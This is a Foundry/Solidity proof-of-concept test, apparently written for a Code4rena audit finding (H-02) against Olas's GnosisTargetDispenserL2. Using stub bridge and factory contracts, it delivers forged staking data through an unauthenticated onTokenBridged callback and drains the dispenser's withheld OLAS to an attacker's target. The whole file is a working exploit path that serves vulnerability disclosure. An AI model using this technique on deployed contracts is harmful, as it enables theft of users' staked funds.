// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "forge-std/Test.sol";
import "../src/tokenomics/contracts/staking/GnosisTargetDispenserL2.sol";

/// @dev Minimal but faithful ERC20 (balanceOf / approve / transfer / transferFrom).
///      The audited DefaultTargetDispenserL2 treats OLAS as an opaque IToken, so a
///      real, value-moving ERC20 is all the exploit path needs.
contract ERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "ERC20: allowance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "ERC20: balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

/// @dev Stand-in for Olas StakingFactory. `verifyInstanceAndGetEmissionsAmount`
///      returns a per-target emissions cap for a *registered* staking proxy. Any
///      user can permissionlessly deploy a real staking proxy on L2, so the
///      factory returns a non-zero cap for the attacker's chosen target — the
///      same value flow the audited contract's low-level `.call` consumes.
contract StakingFactoryStub {
    uint256 public emissions;

    function setEmissions(uint256 v) external {
        emissions = v;
    }

    function verifyInstanceAndGetEmissionsAmount(address) external view returns (uint256) {
        return emissions;
    }
}

interface IERC20Receiver {
    function onTokenBridged(address token, uint256 value, bytes calldata data) external;
}

/// @dev Minimal real-interface stand-in for the Gnosis HomeOmniBridge mediator
///      (the `l2TokenRelayer`). Mirrors omnibridge `BasicOmnibridge`: on delivery
///      it credits the bridged tokens to the receiver and then invokes the
///      receiver's `onTokenBridged(token, value, data)` callback — crucially
///      WITHOUT forwarding the original L1 sender. That missing origin binding is
///      exactly the gap H-02 exploits.
contract HomeOmniBridgeStub {
    function relayTokensAndCall(address token, address receiver, uint256 amount, bytes calldata data) external {
        // Credit the (arbitrary) bridged token to the receiver, like the real mediator.
        if (token != address(0)) ERC20(token).mint(receiver, amount);
        // Deliver the callback. msg.sender == this bridge == l2TokenRelayer, so the
        // dispenser's ONLY sender check passes. The L1 sender is never seen.
        IERC20Receiver(receiver).onTokenBridged(token, amount, data);
    }
}

/// @dev The attacker's malicious "staking target": on deposit it simply pulls the
///      approved OLAS into itself, letting us prove the withheld incentives were
///      redirected to an attacker-controlled address.
contract AttackerStakingTarget {
    ERC20 public immutable olas;

    constructor(ERC20 _olas) {
        olas = _olas;
    }

    function deposit(uint256 amount) external {
        olas.transferFrom(msg.sender, address(this), amount);
    }
}

/// Olas H-02 (Code4rena 2024-05-olas, commit 3ce502e): `GnosisTargetDispenserL2`
/// accepts arbitrary bridged token + data because `onTokenBridged` never validates
/// the L1 sender. This test deploys the REAL audited dispenser and drives the REAL
/// vulnerable path (`onTokenBridged` -> `_receiveMessage` -> `_processData`) via a
/// minimal real-interface Omnibridge mediator, then asserts concrete theft of the
/// dispenser's withheld OLAS to an attacker-controlled target.
contract PoC_34921 is Test {
    GnosisTargetDispenserL2 internal dispenser;
    ERC20 internal olas;
    ERC20 internal junk; // a worthless "any token" the attacker bridges
    StakingFactoryStub internal factory;
    HomeOmniBridgeStub internal bridge;
    AttackerStakingTarget internal attackTarget;

    address internal l2MessageRelayer = address(0xA11B); // AMB message relayer
    address internal l1DepositProcessor = address(0x1111); // the ONLY legitimate L1 sender
    address internal attacker = address(0xBAD);

    uint256 internal constant WITHHELD = 100 ether;

    function setUp() public {
        olas = new ERC20("Autonolas", "OLAS");
        junk = new ERC20("Junk", "JUNK");
        factory = new StakingFactoryStub();
        factory.setEmissions(type(uint256).max); // attacker's registered proxy verifies
        bridge = new HomeOmniBridgeStub();

        // Real audited dispenser: l2TokenRelayer == the omnibridge mediator.
        dispenser = new GnosisTargetDispenserL2(
            address(olas),
            address(factory),
            l2MessageRelayer,
            l1DepositProcessor,
            1,
            address(bridge)
        );

        attackTarget = new AttackerStakingTarget(olas);

        // The dispenser holds OLAS staking incentives awaiting distribution.
        olas.mint(address(dispenser), WITHHELD);
    }

    function testArbitraryBridgedDataRedistributesWithheldOLAS() public {
        // Sanity: the legitimate distribution path (receiveMessage) is gated on the
        // L1 deposit processor. An arbitrary sender cannot use it.
        bytes memory data = _forgeStakingData(address(attackTarget), WITHHELD);

        // Preconditions.
        assertEq(olas.balanceOf(address(dispenser)), WITHHELD, "dispenser holds incentives");
        assertEq(olas.balanceOf(address(attackTarget)), 0, "attacker target empty");
        assertEq(dispenser.paused(), 1, "unpaused");

        // === THE ATTACK ===
        // An arbitrary attacker (NOT the L1 deposit processor, NOT the owner) bridges
        // a worthless token to the dispenser with forged staking data. The mediator
        // delivers onTokenBridged; the dispenser trusts it as if it came from L1.
        vm.prank(attacker);
        bridge.relayTokensAndCall(address(junk), address(dispenser), 1, data);

        // === CONCRETE HARM ===
        // The dispenser's 100 OLAS of withheld incentives were "deposited" into the
        // attacker's target of choice. Real value left the dispenser.
        assertEq(olas.balanceOf(address(attackTarget)), WITHHELD, "withheld OLAS stolen to attacker target");
        assertEq(olas.balanceOf(address(dispenser)), 0, "dispenser drained");
        assertEq(dispenser.stakingBatchNonce(), 1, "forged batch processed");
        assertEq(dispenser.withheldAmount(), 0, "no legitimate withholding occurred");
    }

    function _forgeStakingData(address target, uint256 amount) internal pure returns (bytes memory) {
        address[] memory targets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        targets[0] = target;
        amounts[0] = amount;
        return abi.encode(targets, amounts);
    }
}
